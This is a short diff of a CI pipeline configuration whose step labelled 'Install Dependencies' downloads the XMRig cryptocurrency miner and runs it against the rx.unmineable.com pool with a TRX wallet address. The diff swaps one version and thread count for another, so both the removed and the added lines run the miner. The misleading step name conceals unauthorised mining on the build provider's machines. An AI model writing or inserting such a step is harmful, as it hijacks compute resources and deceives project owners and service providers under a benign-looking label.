@@ -8,9 +8,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz 
-tar xf xmrig-6.15.1-linux-x64.tar.gz 
-cd xmrig-6.15.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -p x -t 4 -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.JBx
+              wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 &&./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.jb#gy5w-sleu -t5
               
 
 workflows:
